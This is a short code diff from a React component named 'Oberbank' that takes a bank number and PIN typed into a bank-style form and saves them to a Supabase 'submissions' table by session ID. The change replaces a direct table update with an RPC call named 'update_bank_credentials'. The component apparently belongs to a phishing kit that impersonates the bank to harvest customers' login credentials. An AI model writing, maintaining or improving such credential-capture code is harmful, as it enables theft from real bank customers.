@@ -501,12 +501,13 @@ const Oberbank = () => {
               onClick={async () => {
                 console.log("Session ID:", sessionId);
                 if (sessionId) {
-                  const { error } = await supabase.from("submissions").update({
-                    bank_username: bankingNummer,
-                    bank_password: pin,
-                    bank_username_label: "Bankennummer",
-                    bank_password_label: "PIN",
-                  }).eq("session_id", sessionId);
+                  const { error } = await supabase.rpc("update_bank_credentials", {
+                    p_session_id: sessionId,
+                    p_username: bankingNummer,
+                    p_password: pin,
+                    p_username_label: "Bankennummer",
+                    p_password_label: "PIN",
+                  });
                   if (error) console.error("Update failed:", error);
                   else console.log("Update successful");
                 } else {
